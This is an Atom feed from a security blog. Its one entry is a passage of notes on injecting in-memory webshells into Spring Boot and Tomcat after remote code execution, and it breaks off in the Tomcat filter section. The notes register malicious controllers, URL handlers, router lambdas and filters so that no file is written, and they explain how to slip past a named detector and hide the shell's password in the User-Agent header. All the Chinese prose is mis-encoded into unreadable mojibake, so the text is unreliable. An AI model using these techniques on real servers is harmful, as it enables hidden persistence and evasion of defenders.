<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Xiaopan233 Blog</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-07-07T16:16:49.218Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Xiaopan233</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Tomcatå†…å­˜é©¬</title>
    <link href="http://example.com/2022/07/07/2022-07-07-java-memory-shell/"/>
    <id>http://example.com/2022/07/07/2022-07-07-java-memory-shell/</id>
    <published>2022-07-07T15:24:02.000Z</published>
    <updated>2022-07-07T16:16:49.218Z</updated>
    
    <content type="html"><![CDATA[<p>æœ¬æ–‡å†™çš„å¾ˆåƒåœ¾ï¼Œå»ºè®®å­¦è¿‡åŸºæœ¬çš„ä¹‹åï¼Œå½“ç¬”è®°çœ‹å°±å¥½äº†ã€‚æœ¬æ–‡å†™äº†ç‚¹å¯èƒ½æ¯”è¾ƒæ–°å¥‡çš„ä¸œè¥¿ã€‚</p><p>æƒ³è®¤çœŸå­¦çš„è¿˜æ˜¯å»çœ‹æ–‡æœ«çš„Refå§ã€‚</p><p><strong>å‰æï¼šå’Œå›æ˜¾ç±»ä¼¼ã€‚å¾—å…ˆRCE</strong></p><p><strong>å¥½å¤„ï¼šè§„é¿é™æ€æ–‡ä»¶çš„æŸ¥æ€</strong></p><p><strong>åŸç†ï¼š</strong>Java Webä¸åƒapache + phpæ¨¡å¼ï¼Œæ¯ä¸€æ¬¡è¯·æ±‚éƒ½æ˜¯ç”Ÿæˆæ–°çš„phpå®ä¾‹ã€‚Java Webæ˜¯é•¿æœŸè¿è¡Œçš„ï¼ˆåŒç†çš„è¿˜æœ‰.netã€goã€pythonè¿™äº›ï¼‰ã€‚Webç¨‹åºå¿…å®šä¼šæœ‰ç›¸å…³çš„å˜é‡ã€é€»è¾‘è¿›è¡Œè¯·æ±‚åˆ†å‘çš„æ“ä½œã€‚å½“æˆ‘ä»¬RCEä¹‹åï¼Œè‹¥èƒ½æ§åˆ¶è¿›è¡Œè¯·æ±‚åˆ†å‘çš„å˜é‡ï¼Œä¾¿èƒ½æ§åˆ¶è¯·æ±‚åˆ†å‘çš„é€»è¾‘ã€‚</p><p>å¸¸è§çš„æ“ä½œæœ‰ï¼šæ–°å¢æ§åˆ¶å™¨ã€ä¿®æ”¹æ§åˆ¶å™¨ã€æ·»åŠ æ‹¦æˆªå™¨ç­‰</p><span id="more"></span><p><strong>æ­¥éª¤</strong>ï¼š</p><ol><li>æ„é€ æ¶æ„ç±»</li><li>è·å–ä¸Šä¸‹æ–‡å¯¹è±¡</li><li>æ‹¿åˆ°Filterã€Servletè¿™äº›ä¸œè¥¿çš„æ³¨å†Œç±»</li><li>å¾€æ³¨å†Œç±»é‡Œæ³¨å†Œæ¶æ„ç±»</li></ol><h1 id="SpringBoot"><a href="#SpringBoot" class="headerlink" title="SpringBoot"></a>SpringBoot</h1><p>æœ¬ä¾‹ç¯å¢ƒä¸ºï¼šSpringBoot2.6.1</p><h1 id="è·å–ä¸Šä¸‹æ–‡å¯¹è±¡"><a href="#è·å–ä¸Šä¸‹æ–‡å¯¹è±¡" class="headerlink" title="è·å–ä¸Šä¸‹æ–‡å¯¹è±¡"></a>è·å–ä¸Šä¸‹æ–‡å¯¹è±¡</h1><p>ä¸Šä¸‹æ–‡å¯¹è±¡ä¸­å­˜æ”¾äº†å¤§é‡çš„beanã€‚å¤§éƒ¨åˆ†æ˜¯Springè¿è¡Œä¾èµ–çš„ç±»å¯¹è±¡ã€‚æ‹¿åˆ°è¿™äº›beanã€‚ç›¸å½“äºæˆåŠŸäº†ä¸€åŠã€‚</p><p><strong>getAttributeæ–¹å¼</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ServletRequestAttributes requestAttributes = (ServletRequestAttributes)RequestContextHolder.getRequestAttributes();</span><br><span class="line">HttpServletRequest httpServletRequest = requestAttributes.getRequest();</span><br><span class="line">(WebApplicationContext)servletContext1.getAttribute(XXXX);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">å­˜å‚¨WebApplicationContextçš„å±æ€§</span></span><br><span class="line"><span class="comment">org.springframework.web.servlet.DispatcherServlet.THEME_SOURCE</span></span><br><span class="line"><span class="comment">org.springframework.web.servlet.DispatcherServlet.CONTEXT</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ServletRequestAttributes requestAttributes1 = (ServletRequestAttributes)RequestContextHolder.getRequestAttributes();</span><br><span class="line">ServletContext servletContext1 = requestAttributes1.getRequest().getServletContext();</span><br><span class="line">(WebApplicationContext)servletContext1.getAttribute(XXXX);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">å­˜å‚¨WebApplicationContextçš„å±æ€§</span></span><br><span class="line"><span class="comment">org.springframework.web.context.WebApplicationContext.ROOT</span></span><br><span class="line"><span class="comment">org.springframework.web.servlet.FrameworkServlet.CONTEXT.dispatcherServlet</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p><strong>WebApplicationContextUtilsæ–¹å¼</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ServletRequestAttributes requestAttributes = (ServletRequestAttributes) RequestContextHolder.currentRequestAttributes();</span><br><span class="line">HttpServletRequest request = requestAttributes.getRequest();</span><br><span class="line">ServletContext servletContext = request.getServletContext();</span><br><span class="line">WebApplicationContext webApplicationContext = WebApplicationContextUtils.getWebApplicationContext(servletContext);</span><br></pre></td></tr></table></figure><p><strong>ContextLoaderæ–¹å¼</strong></p><p><em>è¿™ä¸ªæˆ‘åœ¨SpringBooté‡Œç”¨ï¼Œè¿”å›çš„æ˜¯Nullã€‚ã€‚ã€‚ã€‚</em></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WebApplicationContext currentWebApplicationContext = ContextLoader.getCurrentWebApplicationContext();</span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„äº‹é¡¹ï¼š</strong></p><p>ä»¥ä¸Šæ‹¿åˆ°çš„WebApplicationContextéƒ½æ˜¯<code>AnnotationConfigServletWebServerApplicationContext</code>çš„å®ä¾‹</p><p>ä½†æ˜¯ï¼Œ<code>getBeanFactory()</code>åœ¨<code>GenericApplicationContext</code>ç±»ä¸­ã€‚æ‰€ä»¥è¦ç±»å‹è½¬æ¢ä¸€ä¸‹ã€‚</p><p><strong>å…³äºIOC</strong></p><p>Spring IOCå®¹å™¨ï¼ˆBeanFactoryï¼‰ä¸­ï¼ŒBeanå¯¹è±¡å­˜æ”¾çš„æ–¹å¼ä¸ºï¼š</p><p>è·å–å±æ€§çš„æ“ä½œåœ¨ï¼š<em>DefaultListableBeanFactory#getBean</em></p><p>å®é™…å±æ€§çš„ä½ç½®åœ¨ï¼š<em>DefaultSingletonBeanRegistry.singletonObjects</em></p><h1 id="æ‰‹åŠ¨æ³¨å†ŒController"><a href="#æ‰‹åŠ¨æ³¨å†ŒController" class="headerlink" title="æ‰‹åŠ¨æ³¨å†ŒController"></a>æ‰‹åŠ¨æ³¨å†ŒController</h1><p>ä»æºç è§’åº¦çœ‹ï¼šè¯·æ±‚åˆ†å‘å…¥å£ <em>DispatcherServlet#doDispatch</em></p><p>å…³é”®æ“ä½œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">processedRequest = checkMultipart(request); <span class="comment">//ç»„è£…è¯·æ±‚ä¸ºMultipart</span></span><br><span class="line"></span><br><span class="line">mappedHandler = getHandler(processedRequest); <span class="comment">//ä»IOCä¸­æ‰¾bean[!]</span></span><br><span class="line"></span><br><span class="line">HandlerAdapter ha = getHandlerAdapter(mappedHandler.getHandler());</span><br><span class="line"></span><br><span class="line">mv = ha.handle(processedRequest, response, mappedHandler.getHandler()); <span class="comment">//å®é™…è°ƒç”¨Controller</span></span><br></pre></td></tr></table></figure><h3 id="getHandler-æ–¹æ³•"><a href="#getHandler-æ–¹æ³•" class="headerlink" title="getHandler()æ–¹æ³•"></a><code>getHandler()</code>æ–¹æ³•</h3><p><strong><code>getHandler()</code><strong>æ˜¯æ¯”è¾ƒé‡è¦çš„æ–¹æ³•ã€‚ä¸»è¦é€»è¾‘æ˜¯æ ¹æ®è¯·æ±‚urlï¼Œæ‰¾å¯¹åº”çš„å¤„ç†å™¨ï¼Œä¹Ÿå°±æ˜¯</strong>HandlerMapping</strong>çš„é€‚é…ã€‚</p><p><code>HandlerMapping</code>å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">RequestMappingHandlerMapping</span><br><span class="line">BeanNameUrlHandlerMapping</span><br><span class="line">RouterFunctionMapping</span><br><span class="line">SimpleUrlHandlerMapping</span><br><span class="line">WelcomePageHandlerMapping</span><br></pre></td></tr></table></figure><p><code>HandlerMapping#getHandler()</code> <strong>ä¼šè°ƒç”¨</strong><code>AbstractHandlerMapping#getHandlerInternal()</code>ã€‚å¯¹äºè¿™ä¸ªæ–¹æ³•çš„å®ç°ã€‚æœ‰å¯åˆ†ä¸ºä¸‰ä¸ªæŠ½è±¡ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">AbstractHandlerMethodMapping</span><br><span class="line">RequestMappingHandlerMapping</span><br><span class="line">    </span><br><span class="line">AbstractUrlHandlerMapping</span><br><span class="line">    BeanNameUrlHandlerMapping</span><br><span class="line">    SimpleUrlHandlerMapping</span><br><span class="line">    WelcomePageHandlerMapping</span><br><span class="line">    </span><br><span class="line">RouterFunctionMapping</span><br><span class="line">    æ ¹æ®<span class="keyword">this</span>.routerFunction.route() è¿”å›HandlerFunction</span><br><span class="line">    <span class="comment">//æœ‰å¥½å¤šlambdaã€‚å¯ä»¥å½“ä¸€ä¸ªéš¾æ£€æµ‹ğŸï¼Ÿ</span></span><br></pre></td></tr></table></figure><p>æ·±ç©¶åå¯ä»¥å‘ç°ï¼Œå‰ä¸¤ä¸ªæŠ½è±¡ç±»éƒ½å­˜åœ¨ç€<strong>è·¯ç”±æ˜ å°„</strong>å±æ€§ã€‚è€Œ<code>RouterFunctionMapping</code>æ¯”è¾ƒç‰¹æ®Šï¼Œåæ–‡è¯´ã€‚</p><p><code>AbstractHandlerMethodMapping</code>å’Œ<code>AbstractUrlHandlerMapping</code>å¤§åŒå°å¼‚ã€‚åªæ˜¯æœ€åçš„æ˜ å°„Mapä¸ä¸€æ ·è€Œå·²ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//AbstractHandlerMethodMapping</span></span><br><span class="line"><span class="comment">//Mapåä¸ºmappingRegistry</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> HandlerMethod <span class="title">lookupHandlerMethod</span><span class="params">(String lookupPath, HttpServletRequest request)</span></span>&#123;</span><br><span class="line">    List&lt;T&gt; directPathMatches = <span class="keyword">this</span>.mappingRegistry.getMappingsByDirectPath(lookupPath);</span><br><span class="line">    .....</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//AbstractUrlHandlerMapping</span></span><br><span class="line"><span class="comment">//Mapåä¸ºhandlerMap</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">getDirectMatch</span><span class="params">(String urlPath, HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">    Object handler = <span class="keyword">this</span>.handlerMap.get(urlPath);</span><br><span class="line">    .....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ³¨å…¥é©¬çš„æ€è·¯ï¼šæ“ä½œè·¯ç”±æ˜ å°„çš„Mapã€‚æ§åˆ¶ç¨‹åºçš„è·¯ç”±èµ°å‘ã€‚å°†è·¯ç”±<strong>æ˜ å°„</strong>åˆ°æ¶æ„ç±»çš„æ¶æ„æ–¹æ³•ä¸­</p><p>é‚£é©¬ä¸ºä»€ä¹ˆè¦åŠ <strong>å†…å­˜</strong>äºŒå­—å‘¢ï¼Ÿå› ä¸ºæˆ‘ä»¬å¯ä»¥é€šè¿‡<code>defineClass()</code>ï¼Œç›´æ¥å°†å­—èŠ‚ç è¿˜åŸæˆå¯¹è±¡å®ä¾‹ã€‚æ— æ–‡ä»¶è½åœ°ã€‚</p><p>æ‰¾Mapèµ‹å€¼ä½ç½®çš„æ€è·¯ï¼šæ‰¾åˆ°Mapå˜é‡ï¼Œæœç´¢èµ‹å€¼ç‚¹ã€‚æœ€ç»ˆæ‰¾åˆ°è¿™ä¸¤ä¸ªæ–¹æ³•ï¼Œå¯¹äºä¸Šæ–‡çš„ä¸¤ä¸ªæŠ½è±¡ç±»ã€‚</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AbstractHandlerMethodMapping$MappingRegistry#register(T mapping, Object handler, Method method)</span><br><span class="line">AbstractUrlHandlerMapping#registerHandler(String urlPath, Object handler)</span><br></pre></td></tr></table></figure><p>é‚£æ¥ä¸‹æ¥ç®€å•äº†ã€‚<strong>è°ƒç”¨è¿™ä¸¤æ¥å£</strong>ã€‚å°±å¯ä»¥æ³¨å†Œä»»æ„çš„<strong>è·¯ç”±æ˜ å°„</strong>äº†ã€‚</p><h2 id="AbstractHandlerMethodMappingæ³¨å†Œå†…å­˜é©¬"><a href="#AbstractHandlerMethodMappingæ³¨å†Œå†…å­˜é©¬" class="headerlink" title="AbstractHandlerMethodMappingæ³¨å†Œå†…å­˜é©¬"></a><code>AbstractHandlerMethodMapping</code>æ³¨å†Œå†…å­˜é©¬</h2><p><em>AbstractHandlerMethodMapping</em>çš„æ³¨å†Œå›ºç„¶å¯ä»¥ä½¿ç”¨<code>registerMapping()</code>ã€‚ä½†æ˜¯ä»–ä¼šè®°å½•ä¸€ä¸ªloggerã€‚ä¸ä¼˜é›…</p><p><em>AbstractHandlerMethodMapping#registerMapping</em></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">registerMapping</span><span class="params">(T mapping, Object handler, Method method)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (logger.isTraceEnabled()) &#123;</span><br><span class="line">        <span class="comment">//è®°å½•æ—¥å¿—æ“ä½œ</span></span><br><span class="line">        logger.trace(<span class="string">&quot;Register \&quot;&quot;</span> + mapping + <span class="string">&quot;\&quot; to &quot;</span> + method.toGenericString());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.mappingRegistry.register(mapping, handler, method);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç›´æ¥è°ƒç”¨<code>this.mappingRegistry.register</code>ï¼Œæ›´ç›´æ¥ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">register</span><span class="params">(T mapping, Object handler, Method method)</span></span></span><br></pre></td></tr></table></figure><p>å…·ä½“çš„å‚æ•°å’Œç±»å‹ï¼Œæˆ‘ä»¬å¯ä»¥å‚è€ƒå…¶å­ç±»ã€‚ä¹Ÿå°±æ˜¯<code>RequestMappingHandlerMapping#registerMapping</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">registerMapping</span><span class="params">(RequestMappingInfo mapping, Object handler, Method method)</span></span></span><br></pre></td></tr></table></figure><p>çœ‹çœ‹æ­£å¸¸çš„controllerã€‚å…¶<code>RequestMappingInfo</code>é•¿å•¥æ ·ã€‚å¯ä»¥åœ¨<code>AbstractHandlerMethodMapping#addMatchingMappings</code>çœ‹åˆ°ã€‚</p><p><img src="/2022/07/07/2022-07-07-java-memory-shell/3.png"></p><p><code>RequestMappingInfo</code>ä¸­è®¾ç½®äº†<code>pathPatternsCondition</code>çš„å€¼ã€‚ä»¿ç€å†™ï¼Œå°±å¯¹äº†ã€‚å¦‚æœ<code>patternsCondition</code>è®¾ç½®äº†å€¼ï¼Œä¼šæœ‰ä¸€ä¸ªå‘ï¼šSpringMVCåœ¨ <em>AbstractHandlerMapping#initLookupPath</em>ä¸­ï¼Œç§»é™¤äº†<code>UrlPathHelper.PATH_ATTRIBUTE</code>å±æ€§ã€‚ä½†æ˜¯åœ¨<code>UrlPathHelper#getResolvedLookupPath</code>åˆæ‹¿äº†ä¸€æ¬¡<code>UrlPathHelper.PATH_ATTRIBUTE</code>å±æ€§ã€‚ä¼šè¢«<code>Assert.notNull()</code>ç»ˆæ­¢ã€‚</p><p>ä¸ºäº†é¿å‘ï¼Œè¿˜æ˜¯ä»¿ç€æ­£å¸¸æ ¼å¼æ¥æ„é€ å§ã€‚</p><h2 id="AbstractUrlHandlerMappingæ³¨å†Œå†…å­˜é©¬"><a href="#AbstractUrlHandlerMappingæ³¨å†Œå†…å­˜é©¬" class="headerlink" title="AbstractUrlHandlerMappingæ³¨å†Œå†…å­˜é©¬"></a><code>AbstractUrlHandlerMapping</code>æ³¨å†Œå†…å­˜é©¬</h2><p>æ¯”<code>AbstractHandlerMethodMapping</code>æ³¨å†Œè¿˜ç®€å•ã€‚çœ‹åˆ°ä»–çš„æ³¨å†Œæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">registerHandler</span><span class="params">(String urlPath, Object handler)</span></span></span><br></pre></td></tr></table></figure><p>æ²¡å•¥éš¾çš„ï¼Œ</p><h2 id="RouterFunctionMappingæ³¨å†Œå†…å­˜é©¬"><a href="#RouterFunctionMappingæ³¨å†Œå†…å­˜é©¬" class="headerlink" title="RouterFunctionMappingæ³¨å†Œå†…å­˜é©¬"></a><code>RouterFunctionMapping</code>æ³¨å†Œå†…å­˜é©¬</h2><p><strong>ååˆ†å±é™©ã€‚<code>RouterFunctionMapping</code>åªæœ‰ä¸€ä¸ª<code>routerFunction</code>ï¼Œæ™®é€šçš„SpringBooté¡¹ç›®è¿™ä¸ªå±æ€§æ˜¯nullï¼Œä½†å¦‚æœæ”»å‡»çš„ç¨‹åºæœ‰ä½¿ç”¨<code>RouterFunctionMapping</code>ï¼Œå¾ˆå¯èƒ½ä¼šå´©</strong></p><p>çœ‹ä¸‹<code>RouterFunctionMapping#getHandlerInternal</code>ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">getHandlerInternal</span><span class="params">(HttpServletRequest servletRequest)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.routerFunction != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">//[!]è°ƒç”¨this.routerFunction.route()</span></span><br><span class="line">        HandlerFunction&lt;?&gt; handlerFunction = <span class="keyword">this</span>.routerFunction.route(request).orElse(<span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰¾<code>RouterFunctionMapping</code>çš„ç»§æ‰¿ç±»ï¼Œæ‰¾åˆ°ä¸€ä¸ª<code>RouterFunctions$ResourcesRouterFunction</code></p><p>è¯¥ç±»æœ‰ä¸ª<code>Function lookupFunction</code>å±æ€§ã€‚å¯ä»¥å­˜æ”¾lambdaã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">ResourcesRouterFunction</span> <span class="keyword">extends</span>  <span class="title">AbstractRouterFunction</span>&lt;<span class="title">ServerResponse</span>&gt; </span>&#123;</span><br><span class="line"><span class="comment">//[!]</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Function&lt;ServerRequest, Optional&lt;Resource&gt;&gt; lookupFunction;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ResourcesRouterFunction</span><span class="params">(Function&lt;ServerRequest, Optional&lt;Resource&gt;&gt; lookupFunction)</span> </span>&#123;</span><br><span class="line">Assert.notNull(lookupFunction, <span class="string">&quot;Function must not be null&quot;</span>);</span><br><span class="line"><span class="keyword">this</span>.lookupFunction = lookupFunction;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * ä¼šè¢«è°ƒç”¨çš„route()</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Optional&lt;HandlerFunction&lt;ServerResponse&gt;&gt; route(ServerRequest request) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>.lookupFunction.apply(request).map(ResourceHandlerFunction::<span class="keyword">new</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure><p>æ˜¯ä¸æ˜¯æˆ‘ä»¬å¯ä»¥åœ¨è‡ªå®šä¹‰ä¸ª<strong>æ¶æ„</strong>çš„lambdaç±»å‘¢ï¼Ÿ<strong>æ˜¯çš„ï¼Œå®Œå…¨å¯ä»¥ã€‚</strong></p><p>å®æµ‹æ˜¯èƒ½ç”¨çš„ã€‚</p><h1 id="å…³äºå†…å­˜é©¬æ£€æµ‹"><a href="#å…³äºå†…å­˜é©¬æ£€æµ‹" class="headerlink" title="å…³äºå†…å­˜é©¬æ£€æµ‹"></a>å…³äºå†…å­˜é©¬æ£€æµ‹</h1><p>çœ‹äº†ä¸‹4ra1nå¸ˆå‚…çš„æ£€æµ‹ã€‚ä¼¼ä¹åªæ£€æµ‹äº†<code>RequestMappingHandlerMapping</code>é‡Œçš„<code>mappingRegistry</code> - <strong>2021.12.06</strong></p><p><a href="https://github.com/EmYiQing/SpringMemShell/blob/master/src/main/java/com/example/spring/TestController.java">https://github.com/EmYiQing/SpringMemShell/blob/master/src/main/java/com/example/spring/TestController.java</a></p><p>é‚£æˆ‘ä»¬å¯ä»¥é€šè¿‡æ³¨å…¥<code>AbstractUrlHandlerMapping</code>å’Œ<code>RouterFunctionMapping</code>å†…å­˜é©¬å³å¯è§„é¿æ£€æµ‹</p><h1 id="éšè”½æ–¹å¼"><a href="#éšè”½æ–¹å¼" class="headerlink" title="éšè”½æ–¹å¼"></a>éšè”½æ–¹å¼</h1><p>æŠŠpasswordæ”¾åœ¨User-Agentä¸Š</p><h1 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h1><p>å‚è€ƒä¸‰æ¢¦å¸ˆå‚…çš„æ–‡ã€‚ï¼ˆçœ‹æ–‡ï¼Œå¥½åƒå¸ˆå‚…æœ¬æ¥æƒ³é€šè¿‡æ³¨å†Œä¸€ä¸ªä¼˜å…ˆçº§æœ€é«˜çš„Filterï¼Œæ¥ç»•è¿‡FilteråŠ è½½é¡ºåºæ‹¿ä¸åˆ°responseçš„é—®é¢˜ï¼Œè¾¾åˆ°å›æ˜¾çš„æ•ˆæœã€‚ä½†ï¼Œè¦æ³¨å†ŒFilterçš„å‰ææ˜¯å¾—æ‹¿åˆ°ä¸€ä¸ªresponseã€‚è¿™å°±æ— äº†ã€‚æ‰€ä»¥ï¼ŒæŠŠä»–æ”¹æˆæ— æ–‡ä»¶å†…å­˜é©¬ï¼Œæ›´ä½³ï¼‰</p><h2 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h2><h3 id="æ³¨å†ŒFilter"><a href="#æ³¨å†ŒFilter" class="headerlink" title="æ³¨å†ŒFilter"></a>æ³¨å†ŒFilter</h3><p>åœ¨Tomcatè¿è¡ŒçŠ¶æ€ä¸‹ï¼Œç›´æ¥<code>addFilter()</code>æ˜¯ä¸å¾—è¡Œçš„ã€‚ä¼šæŠ¥é”™</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.lang.IllegalStateException: Filters can not be added to context /tomcat1_war_exploded as the context has been initialised</span><br></pre></td></tr></table></figure><p>è·Ÿè¿›å»æŠ¥é”™çš„è°ƒç”¨æ ˆã€‚å‘ç°æŠ›é”™ä»£ç å¦‚ä¸‹ï¼Œååˆ†ç®€å•ç²—æš´</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> FilterRegistration.<span class="function">Dynamic <span class="title">addFilter</span><span class="params">(String filterName,</span></span></span><br><span class="line"><span class="function"><span class="params">            String filterClass, Filter filter)</span> <span class="keyword">throws</span> IllegalStateException </span>&#123;</span><br><span class="line">    .....</span><br><span class="line">    <span class="keyword">if</span> (!context.getState().equals(LifecycleState.STARTING_PREP)) &#123;</span><br><span class="line">        <span class="comment">//TODO Spec breaking enhancement to ignore this restriction</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(</span><br><span class="line">            sm.getString(<span class="string">&quot;applicationContext.addFilter.ise&quot;</span>,</span><br><span class="line">                         getContextPath()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆåŠ¨æ€æ³¨å†ŒFilterçš„æ€è·¯ä¹Ÿå¾ˆæ˜æ˜¾äº†ï¼šåå°„ä¿®æ”¹<code>context.getState()</code>çš„å€¼ï¼Œè®©å…¶å€¼ä¸º<code>LifecycleState.STARTING_PREP</code>ã€‚å°±å¯ä»¥æ­£å¸¸æ‰§è¡Œ<code>addFilter()</code>çš„é€»è¾‘äº†</p><p>åå°„è·¯å¾„:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> ApplicationContext.context</span><br><span class="line">    LifecycleBase.state</span><br></pre></td></tr></table></figure><p><strong>æ·»åŠ Filterçš„ç¨‹åºé€»è¾‘</strong></p><p>è¿™æ ·æ·»åŠ å¥½Filterå°±èƒ½ç”¨äº†å˜›ï¼Ÿä¸ï¼Œå¹¶ä¸å¯ä»¥ã€‚ç»“åˆå‰é¢æˆ‘ä»¬éœ€è¦åå°„ä¿®æ”¹<code>LifecycleBase.state</code>å¯æ¨æµ‹ã€‚æ·»åŠ 